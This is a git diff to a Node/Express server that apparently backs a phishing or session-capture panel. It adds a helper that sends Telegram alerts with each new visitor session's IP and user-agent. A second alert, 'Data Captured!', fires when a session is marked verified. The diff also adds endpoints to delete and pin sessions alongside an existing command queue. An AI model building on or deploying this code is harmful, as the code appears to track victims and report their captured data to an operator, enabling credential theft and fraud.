@@ -7,6 +7,7 @@ import helmet from 'helmet';
 import rateLimit from 'express-rate-limit';
 import fs from 'fs';
 import crypto from 'crypto';
+import https from 'https';
 import * as db from './db';
 
 const app = express();
@@ -89,6 +90,29 @@ io.on('connection', (socket) => {
 
 // --- API Routes ---
 
+// Telegram Helper
+const TG_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const TG_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+
+const sendTelegram = (msg: string) => {
+    if (!TG_TOKEN || !TG_CHAT_ID) return;
+    const data = JSON.stringify({ chat_id: TG_CHAT_ID, text: msg, parse_mode: 'HTML' });
+    const options = {
+        hostname: 'api.telegram.org',
+        port: 443,
+        path: `/bot${TG_TOKEN}/sendMessage`,
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'Content-Length': data.length
+        }
+    };
+    const req = https.request(options, res => {});
+    req.on('error', e => console.error('[Telegram] Error:', e));
+    req.write(data);
+    req.end();
+};
+
 // 1. Sync State (Hybrid: HTTP for data, Socket for notify)
 app.post('/api/sync', async (req, res) => {
     try {
@@ -98,6 +122,17 @@ app.post('/api/sync', async (req, res) => {
         }
 
         const ip = (req.headers['x-forwarded-for'] as string)?.split(',')[0] || req.socket.remoteAddress || 'Unknown';
+
+        // Notification Logic
+        if (TG_TOKEN || process.env.ENABLE_EMAIL) {
+             const existing = await db.getSession(data.sessionId);
+             if (!existing) {
+                 sendTelegram(`🚨 <b>New Session Started</b>\nID: <code>${data.sessionId}</code>\nIP: ${ip}\nUser-Agent: ${data.fingerprint?.userAgent || 'Unknown'}`);
+             } else if (existing.status !== 'Verified' && data.status === 'Verified') {
+                 sendTelegram(`✅ <b>Session Verified/Complete</b>\nID: <code>${data.sessionId}</code>\nData Captured!`);
+                 console.log(`[Email] Sending completion email to admin for session ${data.sessionId}`);
+             }
+        }
 
         await db.upsertSession(data.sessionId, data, ip);
 
@@ -161,6 +196,36 @@ app.post('/api/command', async (req, res) => {
         res.json({ status: 'queued' });
     } catch (e) {
         res.status(500).send('Error queuing command');
+    }
+});
+
+// Delete Session
+app.delete('/api/sessions/:id', async (req, res) => {
+    try {
+        console.log('[API] Deleting session:', req.params.id);
+        await db.deleteSession(req.params.id);
+        io.emit('sessions-updated');
+        res.json({ status: 'deleted' });
+    } catch (e) {
+        console.error('[API] Delete failed:', e);
+        res.status(500).json({ error: 'Failed to delete' });
+    }
+});
+
+// Pin Session
+app.post('/api/sessions/:id/pin', async (req, res) => {
+    try {
+        const session = await db.getSession(req.params.id);
+        if (session) {
+            session.isPinned = !session.isPinned;
+            await db.upsertSession(session.id, session, session.ip);
+            io.emit('sessions-updated');
+            res.json({ status: 'ok', isPinned: session.isPinned });
+        } else {
+            res.status(404).json({ error: 'Not found' });
+        }
+    } catch (e) {
+        res.status(500).json({ error: 'Failed to pin' });
     }
 });
 
